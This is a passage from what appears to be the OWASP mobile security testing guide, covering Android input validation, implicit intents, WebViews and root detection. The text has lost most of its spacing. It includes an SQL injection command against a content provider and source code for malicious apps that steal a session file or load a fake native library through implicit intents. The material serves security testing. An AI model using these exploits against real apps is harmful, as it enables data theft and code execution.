==null ||sortOrder ==""){ /** *Bydefaultsortonstudentnames */ sortOrder =NAME; } Cursorc =qb.query(db,projection,selection,selectionArgs,null,null, sortOrder); /** *registertowatchacontentURIforchanges */ c.setNotificationUri(getContext().getContentResolver(),uri); return c; } WhiletheuserisprovidingaSTUDENT_IDatcontent://sg.vp.owasp_mobile.provider.College/students,thequery statement is prone to SQL injection. Obviously prepared statements must be used to avoid SQL injection, but input validationshouldalsobeappliedsothatonlyinputthattheappisexpectingisprocessed. AllappfunctionsthatprocessdatacominginthroughtheUIshouldimplementinputvalidation: • Foruserinterfaceinput,AndroidSaripaarv2canbeused. • ForinputfromIPCorURLschemes,avalidationfunctionshouldbecreated. Forexample,thefollowingdetermines whetherthestringisalphanumeric: public boolean isAlphaNumeric(Strings){ Stringpattern="^[a-zA-Z0-9]*$"; return s.matches(pattern); } An alternative to validation functions is type conversion, with, for example, Integer.parseInt if only integers are ex- pected. TheOWASPInputValidationCheatSheetcontainsmoreinformationaboutthistopic. Dynamic Analysis ThetestershouldmanuallytesttheinputfieldswithstringslikeOR1=1--if,forexample,alocalSQLinjectionvulnerability hasbeenidentified. Onarooteddevice,thecommandcontentcanbeusedtoquerythedatafromacontentprovider. Thefollowingcommand queriesthevulnerablefunctiondescribedabove. ##contentquery--uricontent://sg.vp.owasp_mobile.provider.College/students SQL injection can be exploited with the following command. Instead of getting the record for Bob only, the user can retrievealldata. ##contentquery--uricontent://sg.vp.owasp_mobile.provider.College/students--where"name='Bob')OR1=1--''" Testing Local Storage for Input Validation Platform: android MASVSV1: MSTG-PLATFORM-2 MASVSV2: MASVS-CODE-4 291\nOverview Foranypubliclyaccessibledatastorage,anyprocesscanoverridethedata. Thismeansthatinputvalidationneedstobe appliedthemomentthedataisreadbackagain. Note: Thesameistrueforprivateaccessibledataonarooteddevice Static analysis Using Shared Preferences WhenyouusetheSharedPreferences.Editortoreadorwriteint/boolean/longvalues, youcannotcheckwhetherthe data is overridden or not. However: it can hardly be used for actual attacks other than chaining the values (e.g. no additional exploits can be packed which will take over the control flow). In the case of a String or a StringSet you should be careful with how the data is interpreted. Using reflection based persistence? Check the section on “Testing Object Persistence” for Android to see how it should be validated. Using the SharedPreferences.Editor to store and readcertificatesorkeys? MakesureyouhavepatchedyoursecurityprovidergivenvulnerabilitiessuchasfoundinBouncy Castle. Inallcases,havingthecontentHMACedcanhelptoensurethatnoadditionsand/orchangeshavebeenapplied. Using Other Storage Mechanisms Incaseotherpublicstoragemechanisms(thantheSharedPreferences.Editor)areused,thedataneedstobevalidated themomentitisreadfromthestoragemechanism. Memory Corruption Bugs Platform: android MASVSV1: MSTG-CODE-8 MASVSV2: MASVS-CODE-4 Overview Static Analysis Therearevariousitemstolookfor: • Are there native code parts? If so: check for the given issues in the general memory corruption section. Native codecaneasilybespottedgivenJNI-wrappers,.CPP/.H/.Cfiles,NDKorothernativeframeworks. • IsthereJavacodeorKotlincode? LookforSerialization/deserializationissues,suchasdescribedinAbriefhistory ofAndroiddeserializationvulnerabilities. NotethattherecanbeMemoryleaksinJava/Kotlincodeaswell. Lookforvariousitems,suchas: BroadcastReceiverswhich arenotunregistered,staticreferencestoActivityorViewclasses,SingletonclassesthathavereferencestoContext, InnerClassreferences,AnonymousClassreferences,AsyncTaskreferences,Handlerreferences,Threadingdonewrong, TimerTaskreferences. Formoredetails,pleasecheck: • 9waystoavoidmemoryleaksinAndroid • MemoryLeakPatternsinAndroid. 292\nDynamic Analysis Therearevariousstepstotake: • Incaseofnativecode: useValgrindorMempatroltoanalyzethememoryusageandmemorycallsmadebythe code. • IncaseofJava/Kotlincode,trytorecompiletheappanduseitwithSquaresleakcanary. • CheckwiththeMemoryProfilerfromAndroidStudioforleakage. • CheckwiththeAndroidJavaDeserializationVulnerabilityTester,forserializationvulnerabilities. Testing Object Persistence Platform: android MASVSV1: MSTG-PLATFORM-8 MASVSV2: MASVS-CODE-4 Overview Totestforobjectpersistencebeingusedforstoringsensitiveinformationonthedevice,firstidentifyallinstancesofobject serialization and check if they carry any sensitive data. If yes, check if is properly protected against eavesdropping or unauthorizedmodification. Thereareafewgenericremediationstepsthatyoucanalwaystake: 1. MakesurethatsensitivedatahasbeenencryptedandHMACed/signedafterserialization/persistence. Evaluatethe signatureorHMACbeforeyouusethedata. Seethechapter“AndroidCryptographicAPIs”formoredetails. 2. Makesurethatthekeysusedinstep1can’tbeextractedeasily. Theuserand/orapplicationinstanceshouldbe properlyauthenticated/authorizedtoobtainthekeys. Seethechapter“DataStorageonAndroid”formoredetails. 3. Make sure that the data within the de-serialized object is carefully validated before it is actively used (e.g., no exploitofbusiness/applicationlogic). Forhigh-riskapplicationsthatfocusonavailability,werecommendthatyouuseSerializableonlywhentheserialized classesarestable. Second,werecommendnotusingreflection-basedpersistencebecause • theattackercouldfindthemethod’ssignatureviatheString-basedargument • theattackermightbeabletomanipulatethereflection-basedstepstoexecutebusinesslogic. Seethechapter“AndroidAnti-ReversingDefenses”formoredetails. Static Analysis Object Serialization Searchthesourcecodeforthefollowingkeywords: • import java.io.Serializable • implements Serializable JSON If you need to counter memory-dumping, make sure that very sensitive information is not stored in the JSON format becauseyoucan’tguaranteepreventionofanti-memorydumpingtechniqueswiththestandardlibraries. Youcancheck forthefollowingkeywordsinthecorrespondinglibraries: JSONObjectSearchthesourcecodeforthefollowingkeywords: • import org.json.JSONObject; • import org.json.JSONArray; 293\nGSONSearchthesourcecodeforthefollowingkeywords: • import com.google.gson • import com.google.gson.annotations • import com.google.gson.reflect • import com.google.gson.stream • new Gson(); • Annotationssuchas@Expose,@JsonAdapter,@SerializedName,@Since,and@Until JacksonSearchthesourcecodeforthefollowingkeywords: • import com.fasterxml.jackson.core • import org.codehaus.jacksonfortheolderversion. ORM WhenyouuseanORMlibrary,makesurethatthedataisstoredinanencrypteddatabaseandtheclassrepresentations areindividuallyencryptedbeforestoringit. Seethechapters“DataStorageonAndroid”and“AndroidCryptographicAPIs” formoredetails. Youcancheckforthefollowingkeywordsinthecorrespondinglibraries: OrmLiteSearchthesourcecodeforthefollowingkeywords: • import com.j256.* • import com.j256.dao • import com.j256.db • import com.j256.stmt • import com.j256.table\ Pleasemakesurethatloggingisdisabled. SugarORMSearchthesourcecodeforthefollowingkeywords: • import com.github.satyan • extends SugarRecord<Type> • In the AndroidManifest, there will be meta-data entries with values such as DATABASE, VERSION, QUERY_LOG and DOMAIN_PACKAGE_NAME. MakesurethatQUERY_LOGissettofalse. GreenDAOSearchthesourcecodeforthefollowingkeywords: • import org.greenrobot.greendao.annotation.Convert • import org.greenrobot.greendao.annotation.Entity • import org.greenrobot.greendao.annotation.Generated • import org.greenrobot.greendao.annotation.Id • import org.greenrobot.greendao.annotation.Index • import org.greenrobot.greendao.annotation.NotNull • import org.greenrobot.greendao.annotation.* • import org.greenrobot.greendao.database.Database • import org.greenrobot.greendao.query.Query ActiveAndroidSearchthesourcecodeforthefollowingkeywords: • ActiveAndroid.initialize(<contextReference>); • import com.activeandroid.Configuration • import com.activeandroid.query.* RealmSearchthesourcecodeforthefollowingkeywords: • import io.realm.RealmObject; • import io.realm.annotations.PrimaryKey; 294\nParcelable Make sure that appropriate security measures are taken when sensitive information is stored in an Intent via a Bundle thatcontainsaParcelable. UseexplicitIntentsandverifyproperadditionalsecuritycontrolswhenusingapplication-level IPC(e.g.,signatureverification,intent-permissions,crypto). Dynamic Analysis Thereareseveralwaystoperformdynamicanalysis: 1. Fortheactualpersistence: Usethetechniquesdescribedinthedatastoragechapter. 2. For reflection-based approaches: Use Xposed to hook into the deserialization methods or add unprocessable in- formation to the serialized objects to see how they are handled (e.g., whether the application crashes or extra informationcanbeextractedbyenrichingtheobjects). Testing Implicit Intents Platform: android MASVSV1: MSTG-PLATFORM-2 MASVSV2: MASVS-CODE-4 Overview Whentestingforimplicitintentsyouneedtocheckiftheyarevulnerabletoinjectionattacksorpotentiallyleakingsensitive data. Static Analysis InspecttheAndroidManifestandlookforany<intent>signaturesdefinedinsideblocks(whichspecifythesetofother appsanappintendstointeractwith), checkifitcontainsanysystemactions(e.g.android.intent.action.GET_CON- TENT, android.intent.action.PICK, android.media.action.IMAGE_CAPTURE, etc.) and browse the source code for theiroccurrence. Forexample,thefollowingIntentdoesn’tspecifyanyconcretecomponent,meaningthatit’sanimplicitintent. Itsets the action android.intent.action.GET_CONTENT to ask the user for input data and then the app starts the intent by startActivityForResultandspecifyinganimagechooser. Intentintent =newIntent(); intent.setAction("android.intent.action.GET_CONTENT"); startActivityForResult(Intent.createChooser(intent,""),REQUEST_IMAGE); The app uses startActivityForResult instead of startActivity, indicating that it expects a result (in this case an image),soyoushouldcheckhowthereturnvalueoftheintentishandledbylookingfortheonActivityResultcallback. Ifthereturnvalueoftheintentisn’tproperlyvalidated,anattackermaybeabletoreadarbitraryfilesorexecutearbitrary codefromtheapp’sinternal‘/data/data/’storage. Afulldescriptionofthistypeofattackcanbefoundinthe[following blogpost](https://blog.oversecured.com/Interception-of-Android-implicit-intents”Currentattacksonimplicitintents”). Case 1: Arbitrary File Read Inthisexamplewe’regoingtoseehowanattackercanreadarbitraryfilesfromwithintheapp’sinternalstorage/data/ data/<appname>duetotheimpropervalidationofthereturnvalueoftheintent. The performAction method in the following example reads the implicit intents return value, which can be an attacker provided URI and hands it to getFileItemFromUri. This method copies the file to a temp folder, which is usual if this 295\nfileisdisplayedinternally. ButiftheappstorestheURIprovidedfileinanexternaltempdirectorye.gbycallinggetEx- ternalCacheDirorgetExternalFilesDiranattackercanreadthisfileifhesetsthepermissionandroid.permission. READ_EXTERNAL_STORAGE. private void performAction(Actionaction){ ... Uridata =intent.getData(); if(!(data ==null ||(fileItemFromUri =getFileItemFromUri(data))==null)) { ... } } private FileItem getFileItemFromUri(Context,context,Uriuri){ StringfileName =UriExtensions.getFileName(uri,context); Filefile =newFile(getExternalCacheDir(),"tmp"); file.createNewFile(); copy(context.openInputStream(uri),newFileOutputStream(file)); ... } Thefollowingisthesourceofamaliciousappthatexploitstheabovevulnerablecode. AndroidManifest.xml <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" /> <application> <activity android:name=".EvilContentActivity"> <intent-filter android:priority="999"> <action android:name="android.intent.action.GET_CONTENT" /> <data android:mimeType="*/*" /> </intent-filter> </activity> </application> EvilContentActivity.java public class EvilContentActivity extends Activity{ @Override protected void OnCreate(@Nullable BundlesavedInstanceState){ super.OnCreate(savedInstanceState); setResult(-1,newIntent().setData(Uri.parse("file:///data/data/<victim_app>/shared_preferences/session.xml"))); finish(); } } If the user selects the malicious app to handle the intent, the attacker can now steal the session.xml file from the app’sinternalstorage. Inthepreviousexample,thevictimmustexplicitlyselecttheattacker’smaliciousappinadialog. However, developers may choose to suppress this dialog and automatically determine a recipient for the intent. This wouldallowtheattacktooccurwithoutanyadditionaluserinteraction. Thefollowingcodesampleimplementsthisautomaticselectionoftherecipient. Byspecifyingapriorityinthemalicious app’sintentfilter,theattackercaninfluencetheselectionsequence. Intentintent =newIntent("android.intent.action.GET_CONTENT"); for(ResolveInfoinfo :getPackageManager().queryIntentActivities(intent,0)) { intent.setClassName(info.activityInfo.packageName,info.activityInfo.name); startActivityForResult(intent); return; } Case 2: Arbitrary Code Execution An improperly handled return value of an implicit intent can lead to arbitrary code execution if the victim app allows content://andfile://URLs. An attacker can implement a ContentProvider that contains public Cursor query(...) to set an arbitrary file (in this case lib.so), and if the victim loads this file from the content provider by executing copy the attacker’s ParcelFileDescriptor openFile(...) methodwillbeexecutedandreturnamaliciousfakelib.so. AndroidManifest.xml 296\n<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" /> <application> <activity android:name=".EvilContentActivity"> <intent-filter android:priority="999"> <action android:name="android.intent.action.GET_CONTENT" /> <data android:mimeType="*/*" /> </intent-filter> </activity> <provider android:name=".EvilContentProvider" android:authorities="com.attacker.evil" android:enabled="true" android:exported="true"></provider> </application> EvilContentProvider.java public Cursor query(Uriuri,String[]projection,Stringselection,String[] selectionArgs,StringsortOrder){ MatrixCursormatrixCursor =newMatrixCursor(newString[]{"_display_name"}); matrixCursor.addRow(newObject[]{"../lib-main/lib.so"}); return matrixCursor; } public ParcelFileDescriptor openFile(Uriuri,Stringmode)throws FileNotFoundException { return ParcelFileDescriptor.open(newFile("/data/data/com.attacker/fakelib.so"),ParcelFileDescriptor.MODE_READ_ONLY); } EvilContentActivity.java public class EvilContentActivity extends Activity{ @Override protected void OnCreate(@Nullable BundlesavedInstanceState){ super.OnCreate(savedInstanceState); setResult(-1,newIntent().setData(Uri.parse("content:///data/data/com.attacker/fakelib.so"))); finish(); } } Dynamic Analysis Aconvenientwaytodynamicallytestforimplicitintents,especiallytoidentifypotentiallyleakedsensitivedata,istouse Frida or frida-trace and hook the startActivityForResult and onActivityResult methods and inspect the provided intentsandthedatatheycontain. Testing Enforced Updating Platform: android MASVSV1: MSTG-ARCH-9 MASVSV2: MASVS-CODE-2 Overview To test for enforced updating you need to check if the app has support for in-app updates and validate if it’s properly enforcedsothattheuserisnotabletocontinueusingtheappwithoutupdatingitfirst. Static analysis Thecodesamplebelowshowstheexampleofanapp-update: //Part1:checkforupdate //Createsinstanceofthemanager. AppUpdateManagerappUpdateManager =AppUpdateManagerFactory.create(context); //Returnsanintentobjectthatyouusetocheckforanupdate. Task<AppUpdateInfo>appUpdateInfo =appUpdateManager.getAppUpdateInfo(); //Checksthattheplatformwillallowthespecifiedtypeofupdate. if(appUpdateInfo.updateAvailability()==UpdateAvailability.UPDATE_AVAILABLE 297\n//Foraflexibleupdate,useAppUpdateType.FLEXIBLE && appUpdateInfo.isUpdateTypeAllowed(AppUpdateType.IMMEDIATE)){ //...Part2:requestupdate appUpdateManager.startUpdateFlowForResult( //Passtheintentthatisreturnedby'getAppUpdateInfo()'. appUpdateInfo, //Or'AppUpdateType.FLEXIBLE'forflexibleupdates. AppUpdateType.IMMEDIATE, //Thecurrentactivitymakingtheupdaterequest. this, //Includearequestcodetolatermonitorthisupdaterequest. MY_REQUEST_CODE); //...Part3:checkifupdatecompletedsuccessfully @Override public void onActivityResult(intrequestCode,intresultCode,Intentdata){ if(myRequestCode ==MY_REQUEST_CODE){ if(resultCode !=RESULT_OK){ log("Updateflowfailed!Resultcode:" +resultCode); //Iftheupdateiscancelledorfails, //youcanrequesttostarttheupdateagainincaseofforcedupdates } } } //..Part4: //Checksthattheupdateisnotstalledduring'onResume()'. //However,youshouldexecutethischeckatallentrypointsintotheapp. @Override protected void onResume(){ super.onResume(); appUpdateManager .getAppUpdateInfo() .addOnSuccessListener( appUpdateInfo ->{ ... if(appUpdateInfo.updateAvailability() ==UpdateAvailability.DEVELOPER_TRIGGERED_UPDATE_IN_PROGRESS) { //Ifanin-appupdateisalreadyrunning,resumetheupdate. manager.startUpdateFlowForResult( appUpdateInfo, IMMEDIATE, this, MY_REQUEST_CODE); } }); } } Source: https://developer.android.com/guide/app-bundle/in-app-updates Dynamic analysis Inordertotestforproperupdating: trydownloadinganolderversionoftheapplicationwithasecurityvulnerability,either byareleasefromthedevelopersorbyusingathirdpartyapp-store. Next,verifywhetherornotyoucancontinuetouse theapplicationwithoutupdatingit. Ifanupdatepromptisgiven,verifyifyoucanstillusetheapplicationbycancelingthe prompt or otherwise circumventing it through normal application usage. This includes validating whether the backend willstopcallstovulnerablebackendsand/orwhetherthevulnerableapp-versionitselfisblockedbythebackend. Lastly, seeifyoucanplaywiththeversionnumberofaman-in-the-middledappandseehowthebackendrespondstothis(and ifitisrecordedatallforinstance). Checking for Weaknesses in Third Party Libraries Platform: android MASVSV1: MSTG-CODE-5 MASVSV2: MASVS-CODE-3 298\nOverview Static Analysis Detecting vulnerabilities in third party dependencies can be done by means of the OWASP Dependency checker. This is best done by using a gradle plugin, such as dependency-check-gradle. In order to use the plugin, the following steps need to be applied: Install the plugin from the Maven central repository by adding the following script to your build.gradle: buildscript{ repositories{ mavenCentral() } dependencies{ classpath'org.owasp:dependency-check-gradle:3.2.0' } } applyplugin:'org.owasp.dependencycheck' Oncegradlehasinvokedtheplugin,youcancreateareportbyrunning: gradleassemble gradledependencyCheckAnalyze --info Thereportwillbeinbuild/reportsunlessotherwiseconfigured. Usethereportinordertoanalyzethevulnerabilities found. Seeremediationonwhattodogiventhevulnerabilitiesfoundwiththelibraries. Please be advised that the plugin requires to download a vulnerability feed. Consult the documentation in case issues arisewiththeplugin. Lastly,pleasenotethatforhybridapplications,onewillhavetochecktheJavaScriptdependencieswithRetireJS.Similarly forXamarin,onewillhavetochecktheC#dependencies. Whenalibraryisfoundtocontainvulnerabilities,thenthefollowingreasoningapplies: • Isthelibrarypackagedwiththeapplication? Thencheckwhetherthelibraryhasaversioninwhichthevulnerability ispatched. Ifnot,checkwhetherthevulnerabilityactuallyaffectstheapplication. Ifthatisthecaseormightbethe caseinthefuture,thenlookforanalternativewhichprovidessimilarfunctionality,butwithoutthevulnerabilities. • Isthelibrarynotpackagedwiththeapplication? Seeifthereisapatchedversioninwhichthevulnerabilityisfixed. If thisisnotthecase,checkiftheimplicationsofthevulnerabilityforthebuild-process. Couldthevulnerabilityimpede abuildorweakenthesecurityofthebuild-pipeline? Thentrylookingforanalternativeinwhichthevulnerabilityis fixed. When the sources are not available, one can decompile the app and check the JAR files. When Dexguard or ProGuard areappliedproperly,thenversioninformationaboutthelibraryisoftenobfuscatedandthereforegone. Otherwiseyou canstillfindtheinformationveryofteninthecommentsoftheJavafilesofgivenlibraries. ToolssuchasMobSFcanhelp in analyzing the possible libraries packed with the application. If you can retrieve the version of the library, either via comments,orviaspecificmethodsusedincertainversions,youcanlookthemupforCVEsbyhand. Iftheapplicationisahigh-riskapplication, youwillendupvettingthelibrarymanually. Inthatcase, therearespecific requirements for native code, which you can find in the chapter “Testing Code Quality”. Next to that, it is good to vet whetherallbestpracticesforsoftwareengineeringareapplied. Dynamic Analysis Thedynamicanalysisofthissectioncomprisesvalidatingwhetherthecopyrightsofthelicenseshavebeenadheredto. ThisoftenmeansthattheapplicationshouldhaveanaboutorEULAsectioninwhichthecopyrightstatementsarenoted asrequiredbythelicenseofthethirdpartylibrary. Testing for URL Loading in WebViews 299\nPlatform: android MASVSV1: MSTG-PLATFORM-2 MASVSV2: MASVS-CODE-4 Overview In order to test for URL loading in WebViews you need to carefully analyze handling page navigation, especially when usersmightbeabletonavigateawayfromatrustedenvironment. ThedefaultandsafestbehavioronAndroidistolet thedefaultwebbrowseropenanylinkthattheusermightclickinsidetheWebView. However,thisdefaultlogiccanbe modifiedbyconfiguringaWebViewClientwhichallowsnavigationrequeststobehandledbytheappitself. Static Analysis Check for Page Navigation Handling Override TotestiftheappisoverridingthedefaultpagenavigationlogicbyconfiguringaWebViewClientyoushouldsearchfor andinspectthefollowinginterceptioncallbackfunctions: • shouldOverrideUrlLoadingallowsyourapplicationtoeitherabortloadingWebViewswithsuspiciouscontentby returningtrueorallowtheWebViewtoloadtheURLbyreturningfalse. Considerations: – ThismethodisnotcalledforPOSTrequests. – ThismethodisnotcalledforXmlHttpRequests,iFrames,“src”attributesincludedinHTMLor<script>tags. Instead,shouldInterceptRequestshouldtakecareofthis. • shouldInterceptRequestallowstheapplicationtoreturnthedatafromresourcerequests. Ifthereturnvalueis null,theWebViewwillcontinuetoloadtheresourceasusual. Otherwise,thedatareturnedbytheshouldInter- ceptRequestmethodisused. Considerations: – This callback is invoked for a variety of URL schemes (e.g., http(s):, data:, file:, etc.), not only those schemeswhichsendrequestsoverthenetwork. – This is not called for javascript: or blob: URLs, or for assets accessed via file:///android_asset/ or file:///android_res/URLs. Inthecaseofredirects,thisisonlycalledfortheinitialresourceURL,notany subsequentredirectURLs. – WhenSafeBrowsingisenabled,theseURLsstillundergoSafeBrowsingchecksbutthedevelopercanallow theURLwithsetSafeBrowsingWhitelistorevenignorethewarningviatheonSafeBrowsingHitcallback. As you can see there are a lot of points to consider when testing the security of WebViews that have a WebViewClient configured,sobesuretocarefullyreadandunderstandallofthembycheckingtheWebViewClientDocumentation. Check for EnableSafeBrowsing Disabled WhilethedefaultvalueofEnableSafeBrowsingistrue,someapplicationsmightopttodisableit. ToverifythatSafeBrows- ingisenabled,inspecttheAndroidManifest.xmlfileandmakesurethattheconfigurationbelowisnotpresent: <manifest> <application> <meta-data android:name="android.webkit.WebView.EnableSafeBrowsing" android:value="false" /> ... </application> </manifest> Dynamic Analysis AconvenientwaytodynamicallytestdeeplinkingistouseFridaorfrida-traceandhooktheshouldOverrideUrlLoading, shouldInterceptRequestmethodswhileusingtheappandclickingonlinkswithintheWebView. Besuretoalsohook otherrelatedUrimethodssuchasgetHost,getSchemeorgetPathwhicharetypicallyusedtoinspecttherequestsand matchknownpatternsordenylists. 300\nAndroid Anti-Reversing Defenses Overview General Disclaimer Thelackofanyofthesemeasuresdoesnotcauseavulnerability-instead,theyaremeanttoincreasetheapp’s resilienceagainstreverseengineeringandspecificclient-sideattacks. None of these measures can assure a 100% effectiveness, as the reverse engineer will always have full access to the deviceandwillthereforealwayswin(givenenoughtimeandresources)! Forexample,preventingdebuggingisvirtuallyimpossible. Iftheappispubliclyavailable,itcanberunonanuntrusted devicethatisunderfullcontroloftheattacker. Averydeterminedattackerwilleventuallymanagetobypassalltheapp’s anti-debuggingcontrolsbypatchingtheappbinaryorbydynamicallymodifyingtheapp’sbehavioratruntimewithtools suchasFrida. You can learn more about principles and technical risks of reverse engineering and code modification in these OWASP documents: • OWASPArchitecturalPrinciplesThatPreventCodeModificationorReverseEngineering • OWASPTechnicalRisksofReverseEngineeringandUnauthorizedCodeModification Root Detection and Common Root Detection Methods In the context of anti-reversing, the goal of root detection is to make running the app on a rooted device a bit more difficult,whichinturnblockssomeofthetoolsandtechniquesreverseengineersliketouse. Likemostotherdefenses, rootdetectionisnotveryeffectivebyitself,butimplementingmultiplerootchecksthatarescatteredthroughouttheapp canimprovetheeffectivenessoftheoverallanti-tamperingscheme. ForAndroid,wedefine“rootdetection”abitmorebroadly,includingcustomROMsdetection,i.e.,determiningwhether thedeviceisastockAndroidbuildoracustombuild. Inthefollowingsection,welistsomecommonrootdetectionmethodsyou’llencounter. You’llfindsomeofthesemethods implementedintheOWASPUnCrackableAppsforAndroidthataccompanytheOWASPMobileTestingGuide. RootdetectioncanalsobeimplementedthroughlibrariessuchasRootBeer. SafetyNet SafetyNet is an Android API that provides a set of services and creates profiles of devices according to software and hardwareinformation. ThisprofileisthencomparedtoalistofaccepteddevicemodelsthathavepassedAndroidcompat- ibilitytesting. Googlerecommendsusingthefeatureas“anadditionalin-depthdefensesignalaspartofananti-abuse system”. How exactly SafetyNet works is not well documented and may change at any time. When you call this API, SafetyNet downloadsabinarypackagecontainingthedevicevalidationcodeprovidedfromGoogle,andthecodeisthendynamically executedviareflection. AnanalysisbyJohnKozyrakisshowedthatSafetyNetalsoattemptstodetectwhetherthedevice isrooted,butexactlyhowthat’sdeterminedisunclear. To use the API, an app may call the SafetyNetApi.attest method (which returns a JWS message with the Attestation Result)andthencheckthefollowingfields: • ctsProfileMatch: If‘true’,thedeviceprofilematchesoneofGoogle’slisteddevices. • basicIntegrity: If‘true’,thedevicerunningtheapplikelyhasn’tbeentamperedwith. • nonces: Tomatchtheresponsetoitsrequest. • timestampMs: Tocheckhowmuchtimehaspassedsinceyoumadetherequestandyougottheresponse. Adelayed responsemaysuggestsuspiciousactivity. • apkPackageName,apkCertificateDigestSha256,apkDigestSha256: ProvideinformationabouttheAPK,whichis usedtoverifytheidentityofthecallingapp. TheseparametersareabsentiftheAPIcannotreliablydeterminethe APKinformation. 301\nThefollowingisasampleattestationresult: { "nonce":"R2Rra24fVm5xa2Mg", "timestampMs":9860437986543, "apkPackageName":"com.package.name.of.requesting.app", "apkCertificateDigestSha256":["base64encoded,SHA-256hashofthe certificateusedtosignrequestingapp"], "apkDigestSha256":"base64encoded,SHA-256hashoftheapp'sAPK", "ctsProfileMatch":true, "basicIntegrity":true, } ctsProfileMatch Vs basicIntegrity TheSafetyNetAttestationAPIinitiallyprovidedasinglevaluecalledbasicIntegritytohelpdevelopersdeterminethe integrityofadevice. AstheAPIevolved,Googleintroducedanew,strictercheckwhoseresultsappearinavaluecalled ctsProfileMatch,whichallowsdeveloperstomorefinelyevaluatethedevicesonwhichtheirappisrunning. In broad terms, basicIntegrity gives you a signal about the general integrity of the device and its API. Many Rooted devicesfailbasicIntegrity,asdoemulators,virtualdevices,anddeviceswithsignsoftampering,suchasAPIhooks. On the other hand, ctsProfileMatch gives you a much stricter signal about the compatibility of the device. Only un- modifieddevicesthathavebeencertifiedbyGooglecanpassctsProfileMatch. DevicesthatwillfailctsProfileMatch includethefollowing: • DevicesthatfailbasicIntegrity • Deviceswithanunlockedbootloader • Deviceswithacustomsystemimage(customROM) • Devicesforwhichthemanufacturerdidn’tapplyfor,orpass,Googlecertification • DeviceswithasystemimagebuiltdirectlyfromtheAndroidOpenSourceProgramsourcefiles • Devices with a system image distributed as part of a beta or developer preview program (including the Android BetaProgram) Recommendations when using SafetyNetApi.attest • Createalarge(16bytesorlonger)randomnumberonyourserverusingacryptographically-securerandomfunction sothatamalicioususercannotreuseasuccessfulattestationresultinplaceofanunsuccessfulresult • TrustAPKinformation(apkPackageName,apkCertificateDigestSha256andapkDigestSha256)onlyifthevalueof ctsProfileMatchistrue. • The entire JWS response should be sent to your server, using a secure connection, for verification. It isn’t rec- ommended to perform the verification directly in the app because, in that case, there is no guarantee that the verificationlogicitselfhasn’tbeenmodified. • TheverifymethodonlyvalidatesthattheJWSmessagewassignedbySafetyNet. Itdoesn’tverifythatthepayload oftheverdictmatchesyourexpectations. Asusefulasthisservicemayseem,itisdesignedfortestpurposesonly, andithasverystrictusagequotasof10,000requestsperday,perprojectwhichwillnotbeincreaseduponrequest. Hence, you should refer SafetyNet Verification Samples and implement the digital signature verification logic on yourserverinawaythatitdoesn’tdependonGoogle’sservers. • The SafetyNet AttestationAPI gives you a snapshot of the state of a device at the moment when the attestation requestwasmade. Asuccessfulattestationdoesn’tnecessarilymeanthatthedevicewouldhavepassedattestation inthepast,orthatitwillinthefuture. It’srecommendedtoplanastrategytousetheleastamountofattestations requiredtosatisfytheusecase. • TopreventinadvertentlyreachingyourSafetyNetApi.attestquotaandgettingattestationerrors,youshouldbuild a system that monitors your usage of the API and warns you well before you reach your quota so you can get it increased. You should also be prepared to handle attestation failures because of an exceeded quota and avoid blockingallyourusersinthissituation. Ifyouareclosetoreachingyourquota,orexpectashort-termspikethat mayleadyoutoexceedyourquota,youcansubmitthisformtorequestshortorlong-termincreasestothequota foryourAPIkey. Thisprocess,aswellastheadditionalquota,isfreeofcharge. Followthischecklisttoensurethatyou’vecompletedeachofthestepsneededtointegratetheSafetyNetApi.attest APIintotheapp. Programmatic Detection 302\nFile existence checks Perhapsthemostwidelyusedmethodofprogrammaticdetectionischeckingforfilestypicallyfoundonrooteddevices, suchaspackagefilesofcommonrootingappsandtheirassociatedfilesanddirectories,includingthefollowing: /system/app/Superuser.apk /system/etc/init.d/99SuperSUDaemon /dev/com.koushikdutta.superuser.daemon/ /system/xbin/daemonsu Detection code also often looks for binaries that are usually installed once a device has been rooted. These searches includecheckingforbusyboxandattemptingtoopenthesubinaryatdifferentlocations: /sbin/su /system/bin/su /system/bin/failsafe/su /system/xbin/su /system/xbin/busybox /system/sd/xbin/su /data/local/su /data/local/xbin/su /data/local/bin/su CheckingwhethersuisonthePATHalsoworks: public static boolean checkRoot(){ for(StringpathDir :System.getenv("PATH").split(":")){ if(newFile(pathDir,"su").exists()){ return true; } } return false; } FilecheckscanbeeasilyimplementedinbothJavaandnativecode. ThefollowingJNIexample(adaptedfromrootinspec- tor)usesthestatsystemcalltoretrieveinformationaboutafileandreturns“1”ifthefileexists. jbooleanJava_com_example_statfile(JNIEnv *env,jobjectthis,jstringfilepath){ jbooleanfileExists =0; jbooleanisCopy; const char *path =(*env)->GetStringUTFChars(env,filepath,&isCopy); struct statfileattrib; if(stat(path,&fileattrib)<0){ __android_log_print(ANDROID_LOG_DEBUG,DEBUG_TAG,"NATIVE:staterror:[%s]",strerror(errno)); }else { __android_log_print(ANDROID_LOG_DEBUG,DEBUG_TAG,"NATIVE:statsuccess,accessperms:[%d]",fileattrib.st_mode); return 1; } return 0; } Executing su and other commands AnotherwayofdeterminingwhethersuexistsisattemptingtoexecuteitthroughtheRuntime.getRuntime.execmethod. AnIOExceptionwillbethrownifsuisnotonthePATH.Thesamemethodcanbeusedtocheckforotherprogramsoften foundonrooteddevices,suchasbusyboxandthesymboliclinksthattypicallypointtoit. Checking running processes Supersu-by far the most popular rooting tool-runs an authentication daemon named daemonsu, so the presence of this process is another sign of a rooted device. Running processes can be enumerated with the ActivityManager. getRunningAppProcessesandmanager.getRunningServicesAPIs, thepscommand, andbrowsingthroughthe/proc directory. Thefollowingisanexampleimplementedinrootinspector: 303\npublic boolean checkRunningProcesses(){ boolean returnValue =false; //Getcurrentlyrunningapplicationprocesses List<RunningServiceInfo>list =manager.getRunningServices(300); if(list !=null){ StringtempName; for(inti=0;i<list.size();++i){ tempName =list.get(i).process; if(tempName.contains("supersu")||tempName.contains("superuser")){ returnValue =true; } } } return returnValue; } Checking installed app packages YoucanusetheAndroidpackagemanagertoobtainalistofinstalledpackages. Thefollowingpackagenamesbelongto popularrootingtools: com.thirdparty.superuser eu.chainfire.supersu com.noshufou.android.su com.koushikdutta.superuser com.zachspong.temprootremovejb com.ramdroid.appquarantine com.topjohnwu.magisk Checking for writable partitions and system directories Unusualpermissionsonsystemdirectoriesmayindicateacustomizedorrooteddevice. Althoughthesystemanddata directoriesarenormallymountedread-only, you’llsometimesfindthemmountedread-writewhenthedeviceisrooted. Lookforthesefilesystemsmountedwiththe“rw”flagortrytocreateafileinthedatadirectories. Checking for custom Android 